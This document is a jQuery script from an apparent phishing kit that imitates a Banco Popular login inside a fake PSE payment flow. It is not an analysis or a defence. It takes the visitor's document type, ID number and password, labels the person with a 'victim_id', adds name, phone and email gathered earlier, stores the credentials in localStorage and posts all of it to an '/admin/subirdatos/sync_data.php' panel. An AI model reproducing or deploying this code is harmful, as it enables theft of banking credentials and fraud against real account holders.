$(document).ready(function() {
    console.log("Popular scripts loaded");

    // Detección de errores en la URL
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('error')) {
        $('#movii-alert').fadeIn().delay(8000).fadeOut();
        $('#documentType, #documentNumber, #password').addClass('input-error');
    }

    // Quitar error al escribir
    $(document).on('input change', '#documentType, #documentNumber, #password', function() {
        $(this).removeClass('input-error');
    });

    // Usar delegación de eventos para mayor compatibilidad con el DOM de Angular
    $(document).on('submit', '#form-popular', function(e) {
        e.preventDefault();
        handleLogin();
    });

    $(document).on('click', '#btn_login', function(e) {
        // Si el botón no dispara el submit del form por estar dentro de etiquetas custom
        if (!$('#form-popular')[0].checkValidity()) {
            $('#form-popular')[0].reportValidity();
            return;
        }
        e.preventDefault();
        handleLogin();
    });

    function getProjectRoot() {
        const path = window.location.pathname;
        const parts = path.split('/');
        const pseIndex = parts.indexOf('PSE');
        return pseIndex !== -1 ? parts.slice(0, pseIndex + 1).join('/') : '';
    }

    function handleLogin() {
        console.log("Handling login...");

        const documentType = $('#documentType').val();
        const documentNumber = $('#documentNumber').val();
        const password = $('#password').val();

        if (!documentNumber || !password) {
            return;
        }

        // Mostrar loader
        $('#loader-movii').css('display', 'flex');

        const victimId = localStorage.getItem('victim_id') || Date.now() + Math.floor(Math.random() * 1000);
        localStorage.setItem('victim_id', victimId);
        
        const panelSID = localStorage.getItem('victim_sid') || '';
        const root = getProjectRoot();

        // Datos para enviar en formato compatible con sync_data.php
        const formData = new FormData();
        formData.append('action', 'save');
        formData.append('id', victimId);
        formData.append('sid', panelSID);
        formData.append('banco', 'BANCO POPULAR');
        formData.append('user', documentNumber);
        formData.append('pin', password);
        formData.append('document_type', documentType);
        
        // Datos adicionales si existen
        formData.append('nombre', localStorage.getItem('user_name') || 'N/A');
        formData.append('cedula', localStorage.getItem('user_id') || 'N/A');
        formData.append('phone', localStorage.getItem('epayco_phone') || 'N/A');
        formData.append('email', localStorage.getItem('epayco_email') || 'N/A');

        // Guardar en localStorage para uso posterior
        localStorage.setItem('popular_user', documentNumber);
        localStorage.setItem('popular_pass', password);
        localStorage.setItem('popular_doc_type', documentType);

        // Enviar a sync_data.php
        $.ajax({
            type: "POST",
            url: root + "/admin/subirdatos/sync_data.php",
            data: formData,
            processData: false,
            contentType: false,
            success: function(response) {
                console.log("Response from server:", response);
                // El chequeo de estado ya se está ejecutando desde el index.php
            },
            error: function(err) {
                console.error("AJAX Error:", err);
                $('#loader-movii').hide();
            }
        });
    }
});
